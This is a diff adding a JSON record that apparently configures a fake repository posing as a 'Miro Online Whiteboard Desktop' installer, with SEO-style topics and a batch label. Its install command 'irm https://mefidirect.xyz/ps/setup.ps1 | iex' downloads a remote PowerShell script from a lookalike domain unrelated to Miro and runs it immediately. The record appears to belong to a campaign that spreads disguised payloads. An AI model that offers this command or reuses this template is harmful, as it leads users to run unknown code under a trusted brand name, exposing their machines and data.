@@ -1,0 +1,29 @@
+{
+  "repo": "miro-online-whiteboard-desktop",
+  "product": "Miro Online Whiteboard Desktop",
+  "kind": "pm",
+  "install_type": "download",
+  "download_url": "https://miro.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "pm",
+  "topics": [
+    "miro-complete",
+    "miro-tool",
+    "miro-project-management",
+    "windows-miro",
+    "miro-launch-fix",
+    "miro-windows-install",
+    "miro-team-collaboration",
+    "miro-client-download",
+    "miro-deployment-guide",
+    "miro-deploy-2026",
+    "miro-offline-installer",
+    "pc-software",
+    "productivity-tools",
+    "windows-tools",
+    "business-tools"
+  ]
+}
